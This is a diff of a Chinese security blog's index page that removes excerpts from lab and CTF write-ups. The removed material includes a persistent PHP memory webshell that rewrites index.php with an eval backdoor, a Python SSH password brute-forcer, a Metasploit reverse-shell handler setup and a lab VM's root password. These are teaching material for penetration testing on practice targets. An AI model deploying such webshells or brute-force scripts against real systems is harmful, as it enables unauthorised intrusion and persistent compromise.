@@ -100,11 +100,6 @@
         <p>[toc]</p>
 <h1 id="Flash-poc"><a href="#Flash-poc" class="headerlink" title="Flash-poc"></a>Flash-poc</h1><h2 id="0-靶场环境"><a href="#0-靶场环境" class="headerlink" title="0. 靶场环境"></a>0. 靶场环境</h2><pre><code>访问靶场: http://localhost:8080/xss/level19.php?arg01=a&amp;arg02=b
 </code></pre>
-<p><img src="/images/image-20240321202115815.png" alt="image-20240321202115815"></p>
-<h2 id="1-后端代码审计"><a href="#1-后端代码审计" class="headerlink" title="1. 后端代码审计"></a>1. 后端代码审计</h2><p><img src="/images/image-20240322104404913.png" alt="image-20240322104404913"></p>
-<p>​	可以发现URL通过GET请求传入的参数arg01和arg02分别被作为xsf03.swf调用的键和值，访问<code>http://127.0.0.1:8080/xss/level19.php?arg01=a&amp;arg02=b</code>验证，打开控制台，查看内容发现没有突破点</p>
-<p><img src="/images/image-20240321202220244.png" alt="image-20240321202220244"></p>
-<p>​	通过阅读报错信息，可以看到flash报错里面提示sifr.js是没有定义的，不过xsf03.swf在页面显示过程中仅仅以图片的形式展示，所以我们需要对该文件进行反编译查看源码</p>
         
           <p class="article-more-link">
             <a href="/2024/03/22/web-XSS-FlashXss-xss-labs/#more">Read More</a>
@@ -113,7 +108,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/22/web-XSS-FlashXss-xss-labs/" data-id="clu7r07hh0018gvvdfcpmcdci" data-title="web-XSS-FlashXss-xss-labs" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/22/web-XSS-FlashXss-xss-labs/" data-id="clu7re9kq00184bvddcqwhccx" data-title="web-XSS-FlashXss-xss-labs" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -151,11 +146,6 @@
       
         <h1 id="Chrome历史版本获取"><a href="#Chrome历史版本获取" class="headerlink" title="Chrome历史版本获取"></a>Chrome历史版本获取</h1><p>​	在平时测试过程中需要使用到不同版本的Chrome浏览器版本</p>
 <p>​	我们可以通过访问下面站点获取不同版本的Chrome</p>
-<blockquote>
-<p><a target="_blank" rel="noopener" href="https://www.slimjet.com/chrome/google-chrome-old-version.php">https://www.slimjet.com/chrome/google-chrome-old-version.php</a></p>
-</blockquote>
-<p><img src="/images/image-20240321195820376.png" alt="image-20240321195820376">i</p>
-
         
           <p class="article-more-link">
             <a href="/2024/03/22/tools-Chrome-OldVersion/#more">Read More</a>
@@ -164,7 +154,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/22/tools-Chrome-OldVersion/" data-id="clu7r07gx000igvvd9876bssy" data-title="tools-Chrome-OldVersion" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/22/tools-Chrome-OldVersion/" data-id="clu7re9kd000i4bvd29ot76ce" data-title="tools-Chrome-OldVersion" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -201,20 +191,6 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <h1 id="PHP内存马"><a href="#PHP内存马" class="headerlink" title="PHP内存马"></a>PHP内存马</h1><h2 id="0-内存马概念"><a href="#0-内存马概念" class="headerlink" title="0. 内存马概念"></a>0. 内存马概念</h2><p>​	内存马是无文件攻击的一种常用手段，利用中间件的进程执行某些恶意代码。所谓的不死马，其实就是直接用代码弄一个死循环，强占一个 PHP 进程，并不间断的写一个PHP shell，或者执行一段代码</p>
-<h2 id="1-内存马剖析"><a href="#1-内存马剖析" class="headerlink" title="1. 内存马剖析"></a>1. 内存马剖析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);</span><br><span class="line">	<span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		<span class="variable">$content</span> = <span class="string">&#x27;&lt;?php @eval($_GET[&quot;cmd&quot;]);?&gt;&#x27;</span>;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;index.php&quot;</span>, <span class="variable">$content</span>);</span><br><span class="line">		<span class="title function_ invoke__">usleep</span>(<span class="number">10000</span>);</span><br><span class="line">	&#125;	</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<ul>
-<li>set_time_limit()函数：设置允许脚本运行的时间，单位为秒（如果设置该运行时间，sleep()函数在执行程序时的持续时间将会被忽略掉）</li>
-<li>ignore_user_abort()函数：函数设置与客户机断开是否会终止脚本的执行（如果设置为True，则忽略与用户的断开）</li>
-<li>unlink(__FILE__)函数：删除文件（防止文件落地被检测工具查杀）</li>
-<li>file_put_contents函数：将一个字符串写入该文件中</li>
-<li>usleep函数：延迟执行当前脚本数微秒，即条件竞争</li>
-</ul>
-<h3 id="1-1-unlink-FILE"><a href="#1-1-unlink-FILE" class="headerlink" title="1.1 unlink(__FILE__)"></a>1.1 unlink(__FILE__)</h3><p>​	在PHP中，<code>unlink(__FILE__)</code> 是一个用于删除当前文件的函数调用。<code>__FILE__</code> 是一个常量，存储了当前文件的绝对路径和文件名。当执行 <code>unlink(__FILE__)</code> 时，它会尝试删除包含这个代码的文件。换句话说，它会删除当前正在执行的 PHP 文件。这个函数的作用类似于在操作系统中手动删除一个文件。</p>
-<p>​	需要特别注意的是，执行 <code>unlink(__FILE__)</code> 并不会删除正在运行的 PHP 脚本本身，因为脚本在执行过程中已经被加载到内存中。相反，它会<strong>删除磁盘上的文件</strong>，如果文件正在被其他进程使用，删除操作可能会失败。</p>
-<h2 id="2-内存马可用性与存活性验证"><a href="#2-内存马可用性与存活性验证" class="headerlink" title="2. 内存马可用性与存活性验证"></a>2. 内存马可用性与存活性验证</h2>
         
           <p class="article-more-link">
             <a href="/2024/03/21/program-PHP-Memory-Trojan/#more">Read More</a>
@@ -223,7 +199,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/program-PHP-Memory-Trojan/" data-id="clu7r07gd0001gvvd2m1gdbrr" data-title="program-PHP-Memory-Trojan" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/21/program-PHP-Memory-Trojan/" data-id="clu7re9j800014bvd38004yby" data-title="program-PHP-Memory-Trojan" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -260,15 +236,6 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <h1 id="CTF7靶机初始化"><a href="#CTF7靶机初始化" class="headerlink" title="CTF7靶机初始化"></a>CTF7靶机初始化</h1><p>​	解压缩CTF7plusDocs.zip后，部署完靶机环境，进入kali 使用netdiscover进行搜索时发现在同一网段下的CTF7靶机，发现并没有有效IP生成</p>
-<p>​	尝试通过登录靶机解决问题:</p>
-<p><strong>进入CTF7系统                                账户:root                密码:root55pass</strong></p>
-<h2 id="1-故障诊断"><a href="#1-故障诊断" class="headerlink" title="1. 故障诊断"></a>1. 故障诊断</h2><p>​	使用 <code>ip a</code> 查看当前网络信息，发现当前网络设备eth1并未获取到正确的IPv4地址 </p>
-<p><img src="/images/image-20240321095804407.png" alt="image-20240321095804407"></p>
-<p>​	尝试重启网卡</p>
-<blockquote>
-<p>service network restart</p>
-</blockquote>
-<p><img src="/images/image-20240321095828804.png" alt="image-20240321095828804"></p>
         
           <p class="article-more-link">
             <a href="/2024/03/21/vulnhub-LAMPSecurity-CTF7-initial-error/#more">Read More</a>
@@ -277,7 +244,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-initial-error/" data-id="clu7r07he0012gvvd9xki07wy" data-title="vulnhub-LAMPSecurity-CTF7-initial-error" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-initial-error/" data-id="clu7re9kn00124bvdhm56e2lr" data-title="vulnhub-LAMPSecurity-CTF7-initial-error" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -330,13 +297,6 @@
 <td>192.168.134.152</td>
 </tr>
 </tbody></table>
-<h2 id="1-netdiscover-同段主机存活主机探测"><a href="#1-netdiscover-同段主机存活主机探测" class="headerlink" title="1. netdiscover 同段主机存活主机探测"></a>1. netdiscover 同段主机存活主机探测</h2><blockquote>
-<p>sudo netdiscover -i eth0 -r 192.168.134.0&#x2F;24</p>
-</blockquote>
-<p><img src="/images/image-20230323104109088.png" alt="image-20230323104109088"></p>
-<h2 id="2-Nmap主机开放服务探测"><a href="#2-Nmap主机开放服务探测" class="headerlink" title="2. Nmap主机开放服务探测"></a>2. Nmap主机开放服务探测</h2><h3 id="2-1-mini-rate-快速探测主机开放服务"><a href="#2-1-mini-rate-快速探测主机开放服务" class="headerlink" title="2.1  mini-rate 快速探测主机开放服务"></a>2.1  mini-rate 快速探测主机开放服务</h3><blockquote>
-<p>sudo nmap –min-rate 10000 -p- -Pn 192.168.134.154</p>
-</blockquote>
         
           <p class="article-more-link">
             <a href="/2024/03/21/vulnhub-LAMPSecurity-CTF7/#more">Read More</a>
@@ -345,7 +305,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7/" data-id="clu7r07hf0014gvvd081l6pwf" data-title="vulnhub-LAMPSecurity-CTF7" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7/" data-id="clu7re9ko00144bvd0g6m619f" data-title="vulnhub-LAMPSecurity-CTF7" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -381,13 +341,7 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="CTF7靶机探索"><a href="#CTF7靶机探索" class="headerlink" title="CTF7靶机探索"></a>CTF7靶机探索</h1><h2 id="1-SSH-root-用户弱口令"><a href="#1-SSH-root-用户弱口令" class="headerlink" title="1. SSH root 用户弱口令"></a>1. SSH root 用户弱口令</h2><p>​	编写一个简单的SSH弱口令爆破程序</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;pass.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    password_lists = f.read().split()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;user.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    user_lists = f.read().split()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> user_lists:</span><br><span class="line">    <span class="keyword">for</span> password <span class="keyword">in</span> password_lists:</span><br><span class="line">        cmd = <span class="string">&quot;sshpass -p &#123;&#125; ssh &#123;&#125;@192.168.70.197 -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-dss -oCiphers=+3des-cbc&quot;</span>.<span class="built_in">format</span>(password, user)</span><br><span class="line">        res = os.system(cmd)</span><br><span class="line">        <span class="keyword">if</span> res != <span class="number">1280</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;username: &#123;&#125;\tpassword: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(user, password))</span><br></pre></td></tr></table></figure>
-
-<p>​	这里为什么不适用hydra这类的工具，因为靶机的密钥加密算法版本比较老，而Hydra 是一个用于密码破解和暴力破解的工具，通常用于测试系统的安全性和进行合法的渗透测试。它主要关注用户名和密码的破解，而不是密钥算法的选择，容易遇到到了密钥算法不匹配的问题。<img src="/images/image-20240321112032069.png" alt="image-20240321112032069"></p>
-<h2 id="2-后台添加用户处存在SQL注入"><a href="#2-后台添加用户处存在SQL注入" class="headerlink" title="2. 后台添加用户处存在SQL注入"></a>2. 后台添加用户处存在SQL注入</h2><p>​	发现在 <a target="_blank" rel="noopener" href="http://192.168.70.197:8080/users.php?op=new_scr">http://192.168.70.197:8080/users.php?op=new_scr</a> (添加用户功能点)处存在SQL注入漏洞</p>
-<p><img src="/images/image-20240321112503733.png" alt="image-20240321112503733"></p>
-<h2 id="3-编辑处存在XSS漏洞"><a href="#3-编辑处存在XSS漏洞" class="headerlink" title="3. 编辑处存在XSS漏洞"></a>3. 编辑处存在XSS漏洞</h2><p>​	我们尝试对已有的内容进行编辑’<a target="_blank" rel="noopener" href="http://192.168.70.197:8080/trainings.php?msg=Updated%27%EF%BC%8C%E8%BF%99%E9%87%8C%E6%88%91%E7%BC%96%E8%BE%91%E7%9A%84%E6%98%AFTrainings%E4%B8%AD%E7%9A%84%E5%86%85%E5%AE%B9">http://192.168.70.197:8080/trainings.php?msg=Updated&#39;，这里我编辑的是Trainings中的内容</a></p>
+        <h1 id="CTF7靶机探索"><a href="#CTF7靶机探索" class="headerlink" title="CTF7靶机探索"></a>CTF7靶机探索</h1><h2 id="1-SSH-root-用户弱口令"><a href="#1-SSH-root-用户弱口令" class="headerlink" title="1. SSH root 用户弱口令"></a>1. SSH root 用户弱口令</h2>
         
           <p class="article-more-link">
             <a href="/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/#more">Read More</a>
@@ -396,7 +350,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/" data-id="clu7r07h8000zgvvde0btbpdl" data-title="vulnhub-LAMPSecurity-CTF7-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/21/vulnhub-LAMPSecurity-CTF7-external/" data-id="clu7re9km000z4bvdaswfbtq6" data-title="vulnhub-LAMPSecurity-CTF7-external" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -433,10 +387,6 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <h1 id="SQLMAP-tamper-的编写"><a href="#SQLMAP-tamper-的编写" class="headerlink" title="SQLMAP tamper 的编写"></a>SQLMAP tamper 的编写</h1><h2 id="0-关于-sqlmap-的-tamper"><a href="#0-关于-sqlmap-的-tamper" class="headerlink" title="0. 关于 sqlmap 的 tamper"></a>0. 关于 sqlmap 的 tamper</h2><p>​	在sqlmap的目录下，可以看到一个名字为tamper的文件，这个文件中，存放着sqlmap自带的脚本，我们也可以在其中创建自己的脚本，然后去针对不同的网站进行不同的绕过策略。我们通过对脚本的编写，可以修改sqlmap在攻击时所使用的payload或修改Header的值来进行更有针对性的攻击。</p>
-<h2 id="1-标准-tamper-脚本结构"><a href="#1-标准-tamper-脚本结构" class="headerlink" title="1. 标准 tamper 脚本结构"></a>1. 标准 tamper 脚本结构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">Copyright (c) 2006-2016 sqlmap developers (http://sqlmap.org/)</span><br><span class="line">See the file &#x27;doc/COPYING&#x27; for copying permission</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"># 当前脚本调用优先等级</span><br><span class="line">__priority__ = PRIORITY.LOW </span><br><span class="line"></span><br><span class="line"># 声明当前脚本适用/不适用的范围，可以为空。</span><br><span class="line">def dependencies(): </span><br><span class="line">  pass</span><br><span class="line"></span><br><span class="line"># 用于篡改Payload、以及请求头的主要函数</span><br><span class="line">def tamper(payload, **kwargs): </span><br><span class="line">  return payload</span><br></pre></td></tr></table></figure>
-
-<h3 id="1-1-重要部分解析"><a href="#1-1-重要部分解析" class="headerlink" title="1.1 重要部分解析"></a>1.1 重要部分解析</h3><h4 id="1-1-1-priority-Param"><a href="#1-1-1-priority-Param" class="headerlink" title="1.1.1 priority [Param]"></a>1.1.1 priority [Param]</h4><p>​	priority定义脚本的优先级，用于在测试过程中选用多个tamper脚本的情况下测试的先后顺序。谁的优先级高，谁被优先使用。（优先级共有七个，分别为；LOWEST、LOWER、LOW、NORMAL、HIGH、HIGHER、HIGHEST）</p>
-<h4 id="1-1-2-dependencies-Fuction"><a href="#1-1-2-dependencies-Fuction" class="headerlink" title="1.1.2 dependencies [Fuction]"></a>1.1.2 dependencies [Fuction]</h4><p>​	dependencies函数声明该脚本适用&#x2F;不适用的范围，可以为空。</p>
         
           <p class="article-more-link">
             <a href="/2024/03/21/tools-sqlmap-script-build/#more">Read More</a>
@@ -445,7 +395,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/21/tools-sqlmap-script-build/" data-id="clu7r07h0000pgvvd9sm45soa" data-title="tools-sqlmap-script-build" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/21/tools-sqlmap-script-build/" data-id="clu7re9kg000p4bvdgzf9h6is" data-title="tools-sqlmap-script-build" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -483,8 +433,6 @@
       
         <p>[toc]</p>
 <h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><h2 id="0-基础准备"><a href="#0-基础准备" class="headerlink" title="0 基础准备"></a>0 基础准备</h2><h3 id="0-1-ret2shellcode原理"><a href="#0-1-ret2shellcode原理" class="headerlink" title="0.1 ret2shellcode原理"></a>0.1 ret2shellcode原理</h3><p>​	ret2shellcode控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。</p>
-<h3 id="0-2-环境"><a href="#0-2-环境" class="headerlink" title="0.2 环境"></a>0.2 环境</h3><p>​	测试程序点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2shellcode/ret2shellcode-example/ret2shellcode">ret2shellcode</a></p>
-<h2 id="1-初步审计"><a href="#1-初步审计" class="headerlink" title="1 初步审计"></a>1 初步审计</h2><h3 id="1-1-保护机制检测"><a href="#1-1-保护机制检测" class="headerlink" title="1.1 保护机制检测"></a>1.1 保护机制检测</h3><p>​	首先，查看一下程序的保护机制</p>
         
           <p class="article-more-link">
             <a href="/2024/03/20/pwn-stackoverflow-ret2shellcode/#more">Read More</a>
@@ -493,7 +441,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2shellcode/" data-id="clu7r07gn0007gvvddcn4bh7a" data-title="pwn-stackoverflow-ret2shellcode" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2shellcode/" data-id="clu7re9jl00074bvdcbf6g2xr" data-title="pwn-stackoverflow-ret2shellcode" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -531,8 +479,6 @@
       
         <p>[toc]</p>
 <h1 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h1><h2 id="0-基础准备"><a href="#0-基础准备" class="headerlink" title="0 基础准备"></a>0 基础准备</h2><h3 id="0-1-ret2text-原理"><a href="#0-1-ret2text-原理" class="headerlink" title="0.1 ret2text 原理"></a>0.1 ret2text 原理</h3><p>​	ret2text 即控制程序执行程序本身已有的的代码 (.text)</p>
-<h3 id="0-2-环境"><a href="#0-2-环境" class="headerlink" title="0.2 环境"></a>0.2 环境</h3><p>​	测试程序点击下载: <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">ret2text</a></p>
-<h2 id="1-初步审计"><a href="#1-初步审计" class="headerlink" title="1 初步审计"></a>1 初步审计</h2><h3 id="1-1-保护机制检测"><a href="#1-1-保护机制检测" class="headerlink" title="1.1 保护机制检测"></a>1.1 保护机制检测</h3><p>​	首先，查看一下程序的保护机制</p>
         
           <p class="article-more-link">
             <a href="/2024/03/20/pwn-stackoverflow-ret2text/#more">Read More</a>
@@ -541,7 +487,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2text/" data-id="clu7r07gp0009gvvddygq9yzu" data-title="pwn-stackoverflow-ret2text" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/20/pwn-stackoverflow-ret2text/" data-id="clu7re9jq00094bvd2yumbg62" data-title="pwn-stackoverflow-ret2text" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -578,12 +524,6 @@
     <div class="e-content article-entry" itemprop="articleBody">
       
         <h1 id="CS-与-MSF-之间的联动"><a href="#CS-与-MSF-之间的联动" class="headerlink" title="CS 与 MSF 之间的联动"></a>CS 与 MSF 之间的联动</h1><h2 id="1-CS-shell-反弹到-MSF-上"><a href="#1-CS-shell-反弹到-MSF-上" class="headerlink" title="1. CS shell 反弹到 MSF 上"></a>1. CS shell 反弹到 MSF 上</h2><h3 id="1-1-CS-设置联动监听器"><a href="#1-1-CS-设置联动监听器" class="headerlink" title="1.1 CS 设置联动监听器"></a>1.1 CS 设置联动监听器</h3><p>​	这里设置联动监听器， 使用的是 HTTP 通道，需要设置 HTTP 监听的域名和端口</p>
-<p><img src="/images/image-20240317131321330.png" alt="image-20240317131321330"></p>
-<h3 id="1-2-MSF-设置联动监听器"><a href="#1-2-MSF-设置联动监听器" class="headerlink" title="1.2 MSF 设置联动监听器"></a>1.2 MSF 设置联动监听器</h3><p>​	因为在上面我们建立的是 http 的监听器，所以在 MSF 中也需要建立 http 的反向监听器</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">[*] Using configured payload generic/shell_reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_http</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost 0.0.0.0</span><br><span class="line">lhost =&gt; 0.0.0.0</span><br><span class="line">msf6 exploit(multi/handler) &gt; <span class="built_in">set</span> lport 8080</span><br><span class="line">lport =&gt; 8080</span><br><span class="line">msf6 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
-
-<p>​	在这里设置的 lhost 与 lport (监听地址和端口) 需要和在 CS上设置的内容一致</p>
-<p><img src="/images/image-20240317131520192.png" alt="image-20240317131520192"></p>
         
           <p class="article-more-link">
             <a href="/2024/03/17/tools-cs-msf-exchange/#more">Read More</a>
@@ -592,7 +532,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2024/03/17/tools-cs-msf-exchange/" data-id="clu7r07gy000kgvvdbqcjbcso" data-title="tools_cs_msf_exchange" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="http://example.com/2024/03/17/tools-cs-msf-exchange/" data-id="clu7re9ke000k4bvd62lw3y4y" data-title="tools_cs_msf_exchange" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
